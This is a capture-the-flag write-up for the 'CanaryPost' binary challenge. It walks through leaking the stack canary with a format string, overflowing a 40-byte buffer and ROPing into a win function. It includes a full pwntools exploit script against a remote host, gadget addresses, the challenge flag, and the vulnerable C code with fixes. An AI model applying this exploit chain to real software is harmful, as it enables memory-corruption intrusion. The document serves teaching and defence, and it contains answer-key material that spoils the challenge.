# CanaryPost

**Author:** John_x9  
**Difficulty:** Medium-Hard  
**Connect:** `nc 167.86.100.57:9005`

Two-stage guestbook between labs: first a "fmt-ish debug" log line, then a final message. The canary is the wax stamp on the envelope. Leak it, put it back, then ROP into `win` with the NUST-flavored token. Skip the wrong-token sticker.

---

## Blind solve path

### 1. Connect

```bash
nc 167.86.100.57 9005
```

```text
CanaryPost guestbook
log line (fmt-ish debug):
```

After your first line:

```text
final message:
```

Two stages, two inputs. Surviving stage 2 may print `thanks`.

### 2. Stage 1: format string leak

At the debug prompt, send `%p.%p.%p.%p`. Hex values come back: unrestricted format string.

A Linux x86_64 canary often looks like `0x........00` (ends with `00`), stays stable for one connection, and changes on reconnect.

Probe positional slots (`%1$p`, `%2$p`, …). On this build, **`%15$p`** is the stack canary.

```python
from pwn import *
io = remote('167.86.100.57', 9005)
io.recvuntil(b'debug):')
io.sendline(b'%15$p')
print(io.recvuntil(b'final message:'))
```

Expect a `0x...00` style value before `final message:`.

### 3. Stage 2: fat read + canary

At `final message:`, send a huge blob of `B`s without restoring the canary. Connection drops; no clean `thanks`. That is **canary + overflow**.

Restore the leaked canary in the payload, then overwrite saved RIP for ROP.

### 4. Addresses: honest note

No PIE. Stage 1 does not print `win`. You still need gadgets and `win`. Ask organizers for the matching binary, or use this build:

| Piece | Address | Meaning |
|-------|---------|---------|
| `ret` | `0x40101a` | Alignment helper |
| `pop rdi; ret` | `0x4014d2` | Load argument 1 |
| `win` | `0x4012c2` | Prize function (needs correct token) |

Wrong token into `win`:

```text
bad token
nustCTF{wr0ng_t0k3n_k3ep_trylng}
```

Trap. Correct token: `0x4e555354dead` (`NUST` + `dead` vibes).

### 5. Full chain layout

```text
Stage 1: leak canary with %15$p

Stage 2 payload:
  [40 bytes padding]   # msg[40]
  canary
  dummy rbp
  ret
  pop rdi; ret
  0x4e555354dead
  win
```

### 6. Working remote script

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = '167.86.100.57'
PORT = 9005

POP_RDI = 0x4014d2
RET     = 0x40101a
WIN     = 0x4012c2
TOKEN   = 0x4e555354dead

context.log_level = 'error'
io = remote(HOST, PORT)

io.recvuntil(b'debug):')
io.sendline(b'%15$p')
buf = io.recvuntil(b'final message:')
canary = int(re.findall(rb'0x([0-9a-fA-F]+)', buf)[-1], 16)
assert canary & 0xff == 0

payload  = b'B' * 40
payload += p64(canary)
payload += p64(0)
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(TOKEN)
payload += p64(WIN)

io.send(payload)
print(io.recvall(timeout=2).decode(errors='ignore'))
```

Same script: [`solves/05-canarypost-solve.py`](solves/05-canarypost-solve.py).

---

## Real flag

```text
nustCTF{c4n4ry_l34k_th3n_r0p}
```

---

## After the event: vulnerable code and how to fix

Vulnerable pattern (illustrative):

```c
void stage_log(void){
  char note[64];
  puts("log line (fmt-ish debug):");
  fgets(note, sizeof note, stdin);
  printf(note);   /* format string → canary / stack leak */
}

void stage_msg(void){
  char msg[40];
  puts("final message:");
  read(0, msg, 0x100);   /* overflow past canary into saved RIP */
  puts("thanks");
}
```

Stage 1 leaks the canary. Stage 2 overflows `msg[40]` with a 0x100-byte read. Together they defeat the protector.

**Secure coding fixes:**

1. `printf("%s", note)` or `fputs(note, stdout)`: never user format.
2. Bound stage 2: `read(0, msg, sizeof(msg))` (or leave room for NUL if treating as string).
3. Keep canaries enabled, but do not provide an unrestricted format oracle in the same process lifetime as the overflow.
4. Avoid shipping gadget farms / easy `win(token)` helpers in production binaries.
